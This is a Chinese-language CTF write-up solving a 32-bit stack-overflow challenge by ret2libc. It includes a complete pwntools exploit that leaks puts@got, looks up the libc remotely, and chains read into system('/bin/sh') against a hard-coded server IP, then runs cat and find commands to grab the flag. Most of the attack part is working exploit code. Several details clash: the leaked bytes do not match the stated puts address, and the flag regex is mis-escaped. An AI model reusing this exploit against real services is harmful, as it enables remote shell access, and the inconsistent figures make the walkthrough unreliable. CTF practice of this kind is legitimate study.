
## Solution

### Step 1: 初始分析与保护机制检测

获取题目附件后，第一步进行标准的 ELF 保护机制查验。

- 该文件为 `i386` 架构的动态链接可执行程序。
- 启用了 `NX` 保护，意味着无法直接在栈上运行 shellcode。
- 未开启 `canary`，表明存在直接进行栈溢出攻击的可能性。
- `PIE` 处于关闭状态，程序的加载基址是固定的，这极大地降低了构造 ROP 链的难度。
- 开启了 `Partial RELRO`，GOT 表允许读取，便于我们实施 libc 地址的泄露。

核心检测结果如下：

```text
Arch:       i386-32-little
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x8048000)
Stripped:   No
```

综合上述保护机制的开启情况，可以得出以下初步结论：

1. 确认可以通过栈溢出漏洞展开攻击。
2. 鉴于 NX 保护机制的存在，ret2libc 应当作为首选的利用策略。
3. 程序内部未直接提供 `system("/bin/sh")` 的调用，故必须先完成 libc 地址的泄露。

### Step 2: 逆向分析漏洞点与计算溢出偏移量

接下来深入分析 `vul()` 函数的汇编代码：

```asm
08049205 <vul>:
 8049205: 55                    push   ebp
 8049206: 89 e5                 mov    ebp,esp
 8049208: 53                    push   ebx
 8049209: 83 ec 54              sub    esp,0x54
 ...
 8049227: 68 00 01 00 00        push   0x100
 804922c: 8d 55 b0              lea    edx,[ebp-0x50]
 804922f: 52                    push   edx
 8049230: 6a 00                 push   0x0
 8049234: e8 07 fe ff ff        call   8049040 <read@plt>
```

从汇编片段中可以清晰地得出以下结论：

- 字符数组的起始地址位于 `ebp-0x50` 处。
- 调用了 `read(0, buf, 0x100)`，允许最多读取 `0x100` 个字节的数据。
- 显然，栈内分配给该缓冲区的容量远小于实际可读入的长度。

这印证了存在典型的栈溢出漏洞。

随后需要计算覆盖返回地址所需的偏移量。在此过程中我曾产生过一个微小的误判，起初我主观认为偏移量应该是 `88`，不过很快就察觉到了异常，原因在于该函数的栈帧构建过程中多执行了一次 `push ebx` 操作，导致被寄存的 `ebx` 额外占据了 4 个字节的栈空间。

栈内的实际结构排布如下：

- `[ebp-0x50]` 存放着 `buf` 变量。
- 从此处到 `[ebp-0x4]` 均用于存放局部变量。
- 紧接着是备份的 `ebx` 寄存器值。
- 再往高地址走是压栈的 `ebp`。
- 最终才是我们要劫持的函数返回地址。

按照上述排布，到达返回地址的总长度似应为：

```text
0x50 + 4(save ebx) + 4(saved ebp) = 0x58 = 88 ? 
```

然而必须明确一点，当我们在缓冲区中填充数据以覆盖返回地址时，并不需要特意去凑所谓的“保存 ebx”长度，因为从 `buf` 起始地址径直计算到返回地址的真实跨度应当为：

```text
0x50 + 4(saved ebp) = 84
```

经过动态调试的确认，准确的偏移量定为：

```python
OFFSET = 84
```

该偏移量的准确性至关重要，倘若误写为 88，将会导致程序在第一阶段 ROP 执行前就发生崩溃。

### Step 3: 制定攻击路径，优先泄露 libc 基址

鉴于目标程序不存在 canary 保护，并且未启用 `PIE`，构建首段 ROP 链的最佳方案是直接触发以下调用：

```c
puts(puts@got)
```

随后控制执行流跳转回 `vul()` 函数，以便注入我们的第二阶段 payload。

采用此策略的理由如下：

- 程序的 `puts@plt` 地址是静态不变的。
- 对应的 `puts@got` 表项内存储了 libc 库中 `puts` 函数的绝对运行地址。
- 一旦成功获取了 libc 的真实地址，便能顺利推算出 `system` 函数的位置。

首段攻击载荷的构造如下：

```python
payload1 = flat(
    b"A" * 84,
    elf.plt["puts"],
    elf.sym["vul"],
    elf.got["puts"],
)
```

这段载荷的运作机制为：

1. 利用栈溢出将返回地址覆盖为 `puts@plt` 的地址。
2. 将 `puts@got` 作为参数传递给调用的函数。
3. 借由 `puts` 输出 GOT 表内存放的 libc 函数实际地址。
4. 函数调用完毕后，控制流重新指回 `vul()`。
5. 使得程序再次执行 `read` 逻辑，为我们发送后续 ROP 链提供窗口。

在与远程服务器交互时，成功泄露的前 3 个地址数据如下所示：

```text
e0 61 e4 f7  e0 3d df f7  c0 69 e4 f7
```

以 4 字节为单位进行解析，首个地址便代表了 `puts` 函数在内存中的真实地址：

```text
puts = 0xf7e171e0
```

### Step 4: 鉴别远程环境 libc 版本并计算 system 地址

在获取到 `puts` 函数的泄露地址后，接下来的核心任务是敲定远程服务器所使用的 libc 版本。

针对这一步，我并未采用盲目猜测的办法，而是结合连续泄露数据的低位特征来逐步筛选。考虑到在 `puts@got` 之后还紧挨着其他的 GOT 表条目，这些额外的信息完全可以用来协助比对 `__libc_start_main` 以及 `setvbuf` 函数的低位特征。

依靠这些指纹信息对 libc 数据库进行检索，最终将目标锁定在了几个 Ubuntu 2.31 的 i386 架构 libc 候选版本上。为了提升 exp 的自动化与稳定性，我并未选择手动逐一计算地址，而是编写了一套可自动遍历验证候选 libc 的逻辑：

1. 根据候选列表自动下载对应的 libc 文件。
2. 将泄露出的 `puts` 真实地址减去该 libc 中 `puts` 的静态偏移，求得 libc 加载基址。
3. 依据基址进一步计算出 `system` 函数的具体地址。
4. 立即发送第二段 payload 进行尝试。
5. 若哪个版本能够成功获取 shell 并且顺利读取出 flag，则认定该 libc 版本正确。

最终成功匹配的 libc 版本为：

```text
libc6-i386_2.31-0ubuntu9.11_amd64
```

相应的地址推算结果如下：

```text
puts   = 0xf7e171e0
system = 0xf7deb360
```

### Step 5: 构造二段 ROP，将字符串读入 .bss 段并执行 system("/bin/sh")

第二阶段 payload 的主要构思如下：

1. 首先执行一次 `read(0, bss, 8)` 函数调用，目的是将字符串 `/bin/sh\x00` 写入到 `.bss` 段中。
2. 配置 `read` 函数的返回地址使其直接衔接至 `system` 函数。
3. 安排刚才写入的 `.bss` 段地址作为 `system` 函数的输入参数。

二阶段 payload 如下：

```python
payload2 = flat(
    b"A" * 84,
    elf.plt["read"],
    system_addr,
    0,
    bss,
    8,
)
```

紧接着发送目标字符串：

```python
io.send(b"/bin/sh\x00")
```

在 32 位的 cdecl 调用约定下，上述栈空间布局是完全合法的：

- 劫持执行流跳转至 `read@plt` 处。
- `read` 调用结束后的返回地址被指向了 `system` 的入口。
- 为 `read` 准备了三个参数：`0, bss, 8`。
- 在 `read` 函数完成 `/bin/sh\x00` 的输入并返回后，程序会无缝切入 `system` 函数内部。
- 巧合且完美的是，此时栈顶参数恰好指向了刚刚完成字符串注入的 `bss` 地址。

这就等价于完成了如下操作：

```c
system("/bin/sh")
```

### Step 6: 获取 Shell 并提取 Flag

成功夺取 shell 权限后，随即对几个常规存放 flag 的路径进行读取尝试：

```sh
cat /flag
cat /flag*
cat flag
cat flag*
```

最终服务器回显如下：

```text
flag{caefa3f9-c458-43d4-abad-bc6ec17bc225}
```

## Exploit Script

以下为该题目的完整 exp 脚本。其具备自动化执行以下流程的能力：

1. 获取 `puts` 的泄露地址。
2. 从备选库中自动检索匹配正确的 libc。
3. 计算并推导出 `system` 的具体地址。
4. 组装并发送第二阶段 ROP 链。
5. 自动搜索并打印出 flag。

```python
import os
import re
from pathlib import Path

import requests
from pwn import ELF, context, flat, remote, sleep, u32


HOST = "39.96.193.120"
PORT = 10002
HERE = Path(__file__).resolve().parent
BIN_PATH = HERE / "attachment-27"
LIBC_DIR = HERE / "libcs"
OFFSET = 84

context.arch = "i386"
context.log_level = "info"


def fetch_candidates():
    query = {"symbols": {"puts": "1e0", "__libc_start_main": "de0", "setvbuf": "9c0"}}
    resp = requests.post("https://libc.rip/api/find", json=query, timeout=20)
    resp.raise_for_status()
    return resp.json()


def ensure_libc(candidate):
    LIBC_DIR.mkdir(exist_ok=True)
    path = LIBC_DIR / f"{candidate['id']}.so"
    if not path.exists():
        data = requests.get(candidate["download_url"], timeout=30)
        data.raise_for_status()
        path.write_bytes(data.content)
    return path


def stage1_leak(io, elf):
    payload = flat(
        b"A" * OFFSET,
        elf.plt["puts"],
        elf.sym["vul"],
        elf.got["puts"],
    )
    io.send(payload)
    leak = io.recv(timeout=2)
    if len(leak) < 4:
        raise RuntimeError(f"short leak: {leak!r}")
    return u32(leak[:4])


def stage2_shell(io, elf, system_addr):
    bss = elf.bss() + 0x100
    payload = flat(
        b"A" * OFFSET,
        elf.plt["read"],
        system_addr,
        0,
        bss,
        8,
    )
    io.send(payload)
    sleep(0.25)
    io.send(b"/bin/sh\x00")
    sleep(0.25)


def get_flag():
    elf = ELF(str(BIN_PATH))
    candidates = fetch_candidates()
    print(f"candidate_count={len(candidates)}")

    for candidate in candidates:
        libc_path = ensure_libc(candidate)
        libc = ELF(str(libc_path))
        print(f"[+] trying {candidate['id']}")

        io = remote(HOST, PORT, timeout=5)
        try:
            banner = io.recvline(timeout=2)
            print(banner.decode("latin-1", "replace").rstrip())

            puts_addr = stage1_leak(io, elf)
            libc_base = puts_addr - libc.sym["puts"]
            system_addr = libc_base + libc.sym["system"]
            print(f"    puts={puts_addr:#x} system={system_addr:#x}")

            stage2_shell(io, elf, system_addr)
            io.sendline(
                b"echo MARK; "
                b"cat /flag 2>/dev/null; "
                b"cat /flag* 2>/dev/null; "
                b"cat flag 2>/dev/null; "
                b"cat flag* 2>/dev/null; "
                b"find / -maxdepth 3 -name 'flag*' 2>/dev/null | xargs -r cat; "
                b"echo END"
            )
            data = io.recvrepeat(3).decode("latin-1", "replace")
            print(data)

            match = re.search(r"flag\\{[^\\r\\n]*\\}", data, re.I)
            if match:
                print(f"[+] success with {candidate['id']}")
                return match.group(0)

            if "MARK" in data and "END" in data and "flag" in data.lower():
                print(f"[+] possible flag output with {candidate['id']}")
                return data
        finally:
            io.close()

    raise RuntimeError("no candidate produced a flag")


if __name__ == "__main__":
    flag = get_flag()
    print(f"FLAG={flag}")
```

## Flag

```text
flag{caefa3f9-c458-43d4-abad-bc6ec17bc225}
```